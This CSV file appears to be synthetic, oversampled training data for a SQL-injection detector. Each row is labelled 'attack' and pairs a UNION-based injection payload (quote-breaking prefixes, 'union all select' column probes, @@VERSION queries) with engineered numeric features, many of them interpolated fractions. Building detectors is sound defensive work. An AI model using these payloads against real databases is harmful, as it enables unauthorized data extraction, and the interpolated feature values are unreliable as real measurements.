id,label,payload_type,payload,retrieval_method,retrieval_source_id,retrieval_distance,length,num_unique_chars,entropy,alpha_count,digit_count,space_count,punct_count,alpha_ratio,digit_ratio,space_ratio,punct_ratio,single_quote_count,double_quote_count,dash_count,slash_count,star_count,equals_count,semicolon_count,paren_count,percent_count,underscore_count,comma_count,operator_count,has_single_quote,has_double_quote,has_comment_dashdash,has_comment_hash,has_comment_block,has_equal,has_parentheses,has_semicolon,has_percent_encoding,has_hex_literal,has_concat_operator,kw_select,kw_union,kw_where,kw_from,kw_and,kw_or,kw_insert,kw_update,kw_delete,kw_drop,kw_create,kw_alter,kw_sleep,kw_benchmark,kw_waitfor,kw_delay,kw_information_schema,kw_table,kw_column,kw_database,kw_cast,kw_convert,kw_concat,kw_substr,kw_substring,kw_ascii,kw_char,kw_load_file,kw_outfile,kw_exec,kw_order,kw_by,kw_exists,kw_case,kw_when,keyword_total
SMOTE_000033,attack,union,"-3370""  )   union all select 7845,7845,7845,7845,7845,7845#",nearest_attack_euclidean,R000019,0.08727111935941992,59.358810833671086,22.0,3.971850307495381,14.0,28.15947148163159,8.119603611223692,9.079735740815796,0.23618240112890268,0.4744358604608131,0.13651466572591442,0.15286707268436986,0.0,1.0,1.0,0.0,0.0,0.0,0.0,1.019933935203949,0.01993393520394876,0.0,5.039867870407898,1.0,0.0,1.0,0.0,1.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
SMOTE_000034,attack,union,"-4330' union all select 3059,3059,3059,3059,3059,3059,3059,3059,3059--",nearest_attack_euclidean,R000075,1.821380629554858,65.84546079439684,18.584546079439683,3.5936951157299655,14.0,36.67636863551748,4.0,11.16909215887937,0.2138484640186772,0.5556017554072261,0.06109956114819347,0.16945021942590327,0.5845460794396844,0.4154539205603156,3.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,7.169092158879369,3.0,0.5845460794396844,0.4154539205603156,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
SMOTE_000035,attack,union,"1  )   union all select null,null,null,null,null,null,null,null,null--",nearest_attack_euclidean,R000014,0.5347557093213913,67.8668123996868,15.152370542879515,3.0846017833424857,48.17155348544583,1.0,8.0,10.69525891424097,0.7088439091828745,0.014829894795998277,0.11863915836798612,0.15768703765314113,0.15237054287951468,0.0,2.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,7.542888371361455,2.0,0.15237054287951463,0.0,1.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
SMOTE_000036,attack,union,"1%'  )   union all select null,null,null,null,null,null#",nearest_attack_euclidean,R000020,0.23943003604810614,55.90871470212818,16.90871470212818,3.303256557439035,38.0,1.0,8.0,8.908714702128181,0.679697675752964,0.017886780940867486,0.14309424752693978,0.15932129577922874,1.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.9087147021281814,0.0,5.0,0.0,1.0,0.0,0.0,1.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
SMOTE_000037,attack,union,"-5748' union all select 1224,1224,1224,1224,1224,1224,1224,1224,1224#",nearest_attack_euclidean,R000058,0.22091783096883721,69.0,21.0,3.4548487834212533,14.0,40.0,4.0,11.0,0.2028985507246377,0.5797101449275363,0.05797101449275363,0.15942028985507245,1.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,8.0,1.0,1.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
SMOTE_000038,attack,union,"-2207%'   )    )    union all select 3339,3339,3339,3339,3339,3339#",nearest_attack_euclidean,R000073,0.5888793303203715,65.17100094466426,21.83372735860584,3.5823451060215232,14.0,26.66981886884673,14.0,10.501182075817523,0.21577984722140203,0.4078064599579242,0.21577984722140203,0.16063384559927166,1.0,0.0,1.0,0.0,0.0,0.0,0.0,2.0,0.8337273586058411,0.0,4.667454717211682,1.0,1.0,0.0,0.0,1.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
SMOTE_000039,attack,union,"-7531'  )   union all select 3072,3072,3072,3072,3072,3072,3072--",nearest_attack_euclidean,R000016,0.7639508131810375,65.71789375852852,21.0,3.8196980856385836,14.0,31.042808321961967,9.435787517057047,11.239297919509507,0.21311074375126712,0.473033923225026,0.1428920901675294,0.17096324285617745,1.0,0.0,3.0,0.0,0.0,0.0,0.0,1.239297919509508,0.23929791950950802,0.0,5.760702080490492,3.0,1.0,0.0,1.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
SMOTE_000040,attack,union,"-2190'  )   where 8890  =  8890 union all select 8890,8890#",nearest_attack_euclidean,R000078,0.8108279504205406,58.6986891100592,24.397378220118398,3.9224214367560455,22.013108899408003,16.685580210651196,14.6026217798816,5.3973782201184,0.3756570227860746,0.2835989042160247,0.24891088178614426,0.0918331912117564,1.0,0.0,0.6986891100591998,0.0,0.0,1.0,0.0,1.0,0.0,0.0,0.6986891100591994,1.6986891100591996,1.0,0.0,0.0,1.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,1.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.0
SMOTE_000041,attack,union,"1' union all select null,null,null,null,null,null,null,null,null--",nearest_attack_euclidean,R000054,1.126362241245516,68.3439339631909,15.39065566053182,3.0271476357089857,51.562622642127266,1.0,4.0,11.781311321063637,0.754616244995971,0.014658263054884046,0.05863305221953628,0.17209243972960858,1.0,0.0,2.0,0.0,0.0,0.0,0.0,0.0,0.39065566053181844,0.0,8.390655660531818,2.0,1.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
SMOTE_000042,attack,union,"-9860%"" union all select 6996,6996,6996,6996,6996,6996#",nearest_attack_euclidean,R000039,0.648618906384856,55.0,19.853096434524257,3.5382163733904965,14.0,28.0,4.0,9.0,0.2545454545454545,0.509090909090909,0.07272727272727272,0.16363636363636364,0.0,1.0,1.293807130951484,0.0,0.0,0.0,0.0,0.0,0.853096434524258,0.0,5.0,1.293807130951484,0.0,1.0,0.14690356547574196,0.853096434524258,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
SMOTE_000043,attack,union,"1 union all select null,null,null,null,null,null,null,null--",nearest_attack_euclidean,R000022,0.8610101577676343,62.82388428882703,14.282388428882705,3.01789380846827,47.12955371553081,1.0,5.129553715530812,9.564776857765406,0.7518748918204299,0.01599431326456499,0.08011373470870015,0.152017060206305,0.0,0.0,2.0,0.0,0.0,0.0,0.0,0.2823884288827032,0.0,0.0,7.282388428882703,2.0,0.0,0.0,1.0,0.0,0.0,0.0,0.2823884288827031,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
SMOTE_000044,attack,union,"1   )    )     )   union all select null,null,null,null,null,null#",nearest_attack_euclidean,R000029,0.6377478092263866,67.35113973658811,15.225189956098017,3.0894766218326355,38.90075982439207,1.0,18.0,9.450379912196036,0.5774635602734699,0.01486718439886614,0.26760931917959047,0.14005993614807352,0.22518995609801795,0.0,0.0,0.0,0.0,0.0,0.0,3.0,0.0,0.0,5.225189956098018,0.0,0.22518995609801795,0.0,0.0,1.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
SMOTE_000045,attack,union,"-7531'  )   union all select 3072,3072,3072,3072,3072,3072,3072--",nearest_attack_euclidean,R000016,1.179601370360472,66.99387583912203,20.202449664351192,3.7767360466752415,14.0,35.19020134259524,6.404899328702381,11.398775167824404,0.2092496128027015,0.5238591341575353,0.09678405486872056,0.17010719817104264,1.0,0.0,3.0,0.0,0.0,0.0,0.0,0.6012248321755954,0.0,0.0,6.797550335648809,3.0,1.0,0.0,1.0,0.0,0.0,0.0,0.6012248321755953,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
SMOTE_000046,attack,union,"-6667%""   )    )    union all select 7348,7348,7348,7348,7348,7348,7348,7348#",nearest_attack_euclidean,R000030,0.707194541002707,76.33223375111113,21.554822500740755,3.775059213615643,14.0,36.89035499851849,12.664467502222267,12.777411250370378,0.1834588851324051,0.4837832432162027,0.16541114867594925,0.16734672297544304,0.0,1.0,1.0,0.0,0.0,0.0,0.0,1.777411250370378,0.7774112503703781,0.0,7.222588749629622,1.0,0.0,1.0,0.0,1.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
SMOTE_000047,attack,union,"-6294"" union all select 9921,9921,9921,9921,9921,9921--",nearest_attack_euclidean,R000052,1.8812176817044106,60.3832626836633,19.44860522363861,3.719556594146949,14.0,28.0,8.486052236386078,9.897210447277216,0.23409343892231038,0.4681868778446208,0.13383984322023912,0.16387984001282963,0.0,1.0,3.0,0.0,0.0,0.0,0.0,0.8972104472772159,0.0,0.0,5.0,3.0,0.0,1.0,1.0,0.0,0.0,0.0,0.4486052236386079,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
SMOTE_000048,attack,union,"1'  )   union all select null,null,null,null,null,null,null,null,null--",nearest_attack_euclidean,R000046,1.1400381553912935,68.28833153019598,16.0,3.1238884510457146,48.794814013420435,1.0,6.794814013420435,11.698703503355109,0.7155872826994665,0.0147005153270795,0.098165638962127,0.1715465630113269,1.0,0.0,2.0,0.0,0.0,0.0,0.0,0.6987035033551088,0.3012964966448912,0.0,7.698703503355109,2.0,1.0,0.0,1.0,0.0,0.0,0.0,0.6987035033551088,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
SMOTE_000049,attack,union,"1'  )   as hats where 2011  =  2011 union all select null,null,null,null,null#",nearest_attack_euclidean,R000027,1.0329585273423023,73.75969944731536,22.0,3.8125796788828445,43.042938206453236,9.0,14.04293820645324,7.673823034408873,0.5844502376674875,0.12291177612902601,0.18840118125173708,0.10423680495174936,1.0,0.0,0.0,0.0,0.0,1.0,0.0,0.6738230344088734,0.0,0.0,4.0,1.0,1.0,0.0,0.0,1.0,0.0,1.0,0.6738230344088733,0.0,0.0,0.0,0.0,1.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.0
SMOTE_000050,attack,union," select * from users where id  =  1 *$ . union select null,@@VERSION -- 1",nearest_attack_euclidean,R000009,1.1873577905005144,73.82087507575461,29.631874873742305,4.203468504202236,42.905499898993845,2.0,18.915375176760772,10.0,0.5818282244580655,0.02710134279893492,0.2555637187483251,0.13550671399467445,0.0,0.0,2.0,0.0,1.7263749747484614,1.0,0.0,0.5472500505030776,0.0,0.0,0.9999999999999996,4.726374974748461,0.0,0.0,1.0,0.0,0.0,1.0,0.27362502525153876,0.0,0.0,0.0,0.0,2.0,1.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,5.0
SMOTE_000051,attack,union," select * from users where id  =  1 *$ . union select null,@@VERSION -- 1",nearest_attack_euclidean,R000009,0.19946571292259502,73.21542838336906,31.10771419168453,4.341644366737702,44.0,2.0,17.0,10.215428383369057,0.6010084294304587,0.02731856497411178,0.23220780227994994,0.13946520331547954,0.0,0.0,2.0,0.0,2.0,1.0,0.0,0.0,0.0,0.0,0.9999999999999996,5.215428383369057,0.0,0.0,1.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,2.0,1.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,5.0
SMOTE_000052,attack,union," select * from users where id  =  1 *$ . union select null,@@VERSION -- 1",nearest_attack_euclidean,R000009,2.1307210373885517,74.37970129387242,28.700497843545975,4.1093655561976785,42.620298706127585,2.459900431290805,20.219303019035635,9.08019913741839,0.5736436461097563,0.032951212850844264,0.27100832703564715,0.1223968140037524,0.0,0.0,2.0,0.0,1.540099568709195,1.0,0.0,0.91980086258161,0.0,0.0,0.9999999999999996,4.540099568709195,0.0,0.0,1.0,0.0,0.0,1.0,0.4599004312908051,0.0,0.0,0.0,0.0,2.0,1.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,5.0
SMOTE_000053,attack,union,"1%""   )    )    union all select null,null,null,null,null--",nearest_attack_euclidean,R000065,0.01783100665745118,59.06953861349452,16.995032956178964,3.3297516164477954,34.0397363505683,1.0,14.019868175284149,10.009934087642074,0.5762665734443269,0.01693300705514411,0.23733426555673126,0.1694661539437978,0.0,1.0,2.0,0.0,0.0,0.0,0.0,2.004967043821037,0.9950329561789626,0.0,4.009934087642074,2.0,0.0,1.0,1.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
SMOTE_000054,attack,union,"1'  )   where 8268  =  8268 union all select null,null,null,null--",nearest_attack_euclidean,R000066,0.09622456468983566,65.78579805240742,23.019472904326598,3.845864882497807,34.68843353077442,9.136310330286191,14.0,7.961054191346802,0.526703493442659,0.13937308521411074,0.21294733533506782,0.12097608600816244,0.9805270956734011,0.019472904326598872,2.019472904326599,0.0,0.0,1.0,0.0,1.0,0.0,0.0,2.9415812870202034,3.019472904326599,0.9805270956734011,0.019472904326598872,1.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,1.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.0
SMOTE_000055,attack,union,"-8521'  )   union all select 2446,2446,2446,2446,2446,2446,2446#",nearest_attack_euclidean,R000067,0.11529797994160808,64.60700031910685,22.0,3.7335409520858396,14.0,32.485600255285476,8.0,10.121400063821369,0.21695565784047807,0.5024608121044871,0.12397466162313034,0.15660886843190439,1.0,0.0,1.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,6.121400063821369,1.0,1.0,0.0,0.0,1.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
SMOTE_000056,attack,union,"-7531'  )   union all select 3072,3072,3072,3072,3072,3072,3072--",nearest_attack_euclidean,R000016,0.7605911282502318,65.71473662223018,21.0,3.8198909797856437,14.0,31.047017837026434,9.42947324446035,11.238245540743392,0.21312074373049267,0.4731186849536997,0.14280494749142114,0.17095562382438656,1.0,0.0,3.0,0.0,0.0,0.0,0.0,1.2382455407433919,0.23824554074339174,0.0,5.761754459256609,3.0,1.0,0.0,1.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
SMOTE_000057,attack,union,"-8812""  )   where 1646  =  1646 union all select 1646,1646,1646,1646,1646,1646--",nearest_attack_euclidean,R000043,0.21289763439592035,80.0,24.263859440555525,3.8055598903427477,19.39578916083329,35.20842167833342,14.527718881111051,10.868070279722238,0.2424473645104161,0.4401052709791678,0.18159648601388811,0.135850878496528,0.0,1.0,3.0,0.0,0.0,1.0,0.0,1.0659648601388814,0.0,0.0,4.802105419583356,4.0,0.0,1.0,1.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,1.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.0
SMOTE_000058,attack,union," select * from users where id  =  1 union select @ $$,version  (    )   -- 1",nearest_attack_euclidean,R000011,2.0294501208155653,77.34816605824341,26.0,3.849009603413877,40.550611313918864,3.0,24.449388686081136,9.348166058243407,0.5245788893187632,0.038800050270697856,0.3160888665463565,0.1205321938641825,1.3481660582434078,0.0,2.0,0.0,1.0,1.0,0.0,2.0,0.0,0.0,0.9999999999999996,4.0,0.4493886860811359,0.0,1.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,2.0,1.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,5.0
SMOTE_000059,attack,union,"-6667%""   )    )    union all select 7348,7348,7348,7348,7348,7348,7348,7348#",nearest_attack_euclidean,R000030,1.4737105977593774,69.3719010906976,22.0,3.8111882739210663,14.0,29.897520872558086,14.0,11.474380218139522,0.20615023575535052,0.4230395689045019,0.20615023575535052,0.16465995958479704,0.0,1.0,1.0,0.0,0.0,0.0,0.0,2.0,1.0,0.0,5.474380218139522,1.0,0.0,1.0,0.0,1.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
SMOTE_000060,attack,union,"-1401""   )    )    union all select 3480,3480,3480,3480,3480,3480--",nearest_attack_euclidean,R000072,0.7581220241631841,65.84528610471476,20.28867847382131,3.799316668152541,14.0,26.845286104714752,14.0,11.0,0.21278512071404726,0.40724144943943974,0.21278512071404726,0.16718830913246568,0.0,1.0,3.0,0.0,0.0,0.0,0.0,2.0,0.28867847382131157,0.0,4.711321526178688,3.0,0.0,1.0,1.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
SMOTE_000061,attack,union,"1'  )   as hats where 2011  =  2011 union all select null,null,null,null,null#",nearest_attack_euclidean,R000027,0.4041513173940738,76.02721283665008,22.098639358167496,3.827662907078371,43.421770269320064,9.0,16.0,7.605442567330016,0.5693354339871156,0.11930925828252636,0.21210534805782466,0.09924995967253328,1.0,0.0,0.0,0.0,0.0,1.0,0.0,1.0,0.0,0.0,3.605442567330016,1.0,1.0,0.0,0.0,1.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,1.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.0
SMOTE_000062,attack,union," select * from users where id  =  1 union select @ $$,version  (    )   -- 1",nearest_attack_euclidean,R000011,0.07735874330721898,75.9405720278939,26.11885594421223,3.8643943492869894,40.079237296141486,2.0,23.8613347317524,10.0,0.5278296959969353,0.026337212679201888,0.3141470279278531,0.13168606339600958,0.0,0.0,2.0,0.0,1.0,1.0,0.0,1.9603813519292577,0.0,0.0,0.9999999999999996,4.019809324035371,0.0,0.0,1.0,0.0,0.0,1.0,0.9801906759646288,0.0,0.0,0.0,0.0,2.0,1.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,5.0
SMOTE_000063,attack,union,"1%' union all select null,null,null,null,null,null,null,null,null,null--",nearest_attack_euclidean,R000036,0.020853244388574915,71.89005624463083,16.0,3.037182176410382,53.91204499570466,1.0,4.0,12.978011248926165,0.7499113356811539,0.013913517866346176,0.055654071465384564,0.1805210749871154,1.0,0.0,2.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,8.978011248926165,2.0,1.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
SMOTE_000064,attack,union," select * from users where id  =  1 *$ . union select null,@@VERSION -- 1",nearest_attack_euclidean,R000009,0.018328700894173513,73.01979549439862,31.009897747199307,4.335600312732053,44.0,2.0,17.0,10.019795494398616,0.6025806389491253,0.027390029043142083,0.23281524686670746,0.13721408514102518,0.0,0.0,2.0,0.0,2.0,1.0,0.0,0.0,0.0,0.0,0.9999999999999996,5.019795494398617,0.0,0.0,1.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,2.0,1.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,5.0
SMOTE_000065,attack,union,"-5131'   )    )     )   union all select 4854,4854,4854,4854,4854,4854,4854#",nearest_attack_euclidean,R000049,1.1368180693742707,72.69008557895934,21.367768269004518,3.5685970751912692,14.0,30.528926923981928,16.528926923981928,11.632231730995482,0.19331084090623904,0.4198970360753982,0.22658619516915912,0.16020592784920357,1.0,0.0,1.0,0.0,0.0,0.0,0.0,2.632231730995482,0.36776826900451837,0.0,5.632231730995482,1.0,1.0,0.0,0.0,1.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
